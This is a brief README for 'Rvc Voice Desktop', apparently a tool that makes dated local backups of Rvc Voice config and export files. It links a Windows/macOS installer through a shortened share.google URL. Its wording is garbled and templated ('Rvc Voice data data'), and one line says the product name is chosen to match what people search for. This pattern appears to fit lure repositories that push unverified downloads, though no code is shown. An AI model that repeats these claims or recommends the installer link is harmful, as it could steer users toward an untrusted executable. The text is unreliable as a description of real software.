# Rvc Voice Desktop

*Dated copies of Rvc Voice data data, nothing uploaded.*

## Overview

This repository is **Rvc Voice Desktop**, a desktop helper. Dated copies of Rvc Voice data data, nothing uploaded.

Rvc Voice config and export files hide under AppData and Documents.

No browser upload step: the work happens on disk, then you keep the output folder.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Maps Rvc Voice data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## Background

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
